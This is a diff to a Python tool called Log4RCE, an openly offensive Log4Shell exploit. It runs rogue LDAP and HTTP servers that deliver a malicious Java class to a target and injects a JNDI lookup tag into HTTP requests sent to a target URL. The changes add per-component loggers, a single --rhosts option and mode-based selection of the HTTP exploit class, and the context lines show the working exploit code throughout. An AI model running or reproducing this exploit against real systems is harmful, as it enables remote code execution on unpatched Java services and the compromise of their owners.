@@ -25,6 +25,10 @@ JAVA_CLASSES: Dict[str, bytes] = {
 INJECTION_TAG = "###"
 LISTEN_HOST = "0.0.0.0"
 
+http_logger = logging.getLogger("HTTP")
+ldap_logger = logging.getLogger("LDAP")
+log4j_logger = logging.getLogger("Log4RCE")
+
 class Serializer():
     """
     Stack-based Serialization utility.
@@ -145,6 +149,8 @@ class LDAPHandler(socketserver.BaseRequestHandler):
         super().__init__(*args, **kwargs)
 
     def handle(self):
+        ldap_logger.info(f"Query from {self.request.getpeername()}")
+
         handshake = self.request.recv(8096)
 
         self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
@@ -190,6 +196,9 @@ class HTTPHandler(http.server.BaseHTTPRequestHandler):
 
         self.wfile.write(self.__java_class.raw)
 
+    def log_message(self, format, *args):
+        http_logger.info(f"Request from {self.client_address} to {self.path}")
+
 class Log4RCE():
     """
     Main handler for Log4RCE exploit.
@@ -226,8 +235,8 @@ class Log4RCE():
             server.serve_forever()
 
     def start_http(self):
-        logging.info(f"HTTP -> Running on local port {self.__local_ports['http']}")
-        logging.info(f"Target Class -> {self.target_url + self.__java_class.name + '.class'}")
+        http_logger.info(f"Running on local port {self.__local_ports['http']}")
+        http_logger.info(f"Remote target is {self.target_url + self.__java_class.name + '.class'}")
         self._start_process(target=self._http_process)
 
     def _ldap_process(self):
@@ -235,11 +244,11 @@ class Log4RCE():
             server.serve_forever()
 
     def start_ldap(self):
-        logging.info(f"LDAP -> Running on local port {self.__local_ports['ldap']}")
+        ldap_logger.info(f"Running on local port {self.__local_ports['ldap']}")
         self._start_process(target=self._ldap_process)
 
     def exploit(self):
-        logging.info(f"Payload -> {self.jndi_ldap_tag}")
+        log4j_logger.warning(f"Use the payload {self.jndi_ldap_tag}")
         while True:
             pass
 
@@ -267,7 +276,7 @@ class HTTPLog4RCE(Log4RCE):
     headers: str = ""
 
     def exploit(self):
-        logging.info(f"HTTP -> Sending payload to {self.url}")
+        log4j_logger.info(f"Sending payload to {self.url}")
 
         parsed_url = urllib.parse.urlparse(self.url.replace(INJECTION_TAG, self.jndi_ldap_tag))
 
@@ -305,6 +314,7 @@ def main():
     parser.add_argument("--java_class", "-j", help="The Java class file to run on the target.", default=None)
     parser.add_argument("--target", "-b", help="The built-in Java class to run on the target.", choices=JAVA_CLASSES.keys(), default="any")
     parser.add_argument("--payload", "-p", help="The payload to run on the target.", default=None)
+    parser.add_argument("--rhosts", "-rh", help="Sets all rhost variables.", default=None)
     parser.add_argument("--http_port", "-hl", help="The local port to serve the HTTP server.", type=int, default=1337)
     parser.add_argument("--http_rhost", "-hh", help="The remote host name that serves the HTTP server.", default="127.0.0.1")
     parser.add_argument("--http_rport", "-hr", help="The remote port where the HTTP server will be exposed.", type=int, default=None)
@@ -312,7 +322,7 @@ def main():
     parser.add_argument("--ldap_rhost", "-lh", help="The remote host name that serves the LDAP server.", default="127.0.0.1")
     parser.add_argument("--ldap_rport", "-lr", help="The remote port to where the LDAP server will be exposed.", type=int, default=None)
 
-    parser_modes = parser.add_subparsers(help="Log4RCE modes.")
+    parser_modes = parser.add_subparsers(help="Log4RCE modes.", dest="mode")
 
     parser_manual = parser_modes.add_parser("manual", help="Mode to enter JNDI tag manually.")
 
@@ -329,10 +339,16 @@ def main():
         "ldap": args.ldap_port
     }
 
-    remote_hosts = {
-        "http": args.http_rhost,
-        "ldap": args.ldap_rhost
-    }
+    if args.rhosts:
+        remote_hosts = {
+            "http": args.rhosts,
+            "ldap": args.rhosts
+        }
+    else:
+        remote_hosts = {
+            "http": args.http_rhost,
+            "ldap": args.ldap_rhost
+        }
 
     remote_ports = {
         "http": args.http_rport if args.http_rport else local_ports["http"],
@@ -347,7 +363,7 @@ def main():
     if args.payload:
         java_class.inject(args.payload)
 
-    if args.url:
+    if args.mode == "http":
         log4rce_class = HTTPLog4RCE
     else:
         log4rce_class = Log4RCE
@@ -359,7 +375,7 @@ def main():
         java_class=java_class
     )
 
-    if args.url:
+    if args.mode == "http":
         log4rce.url = args.url
         log4rce.method = args.method
         log4rce.data = args.data
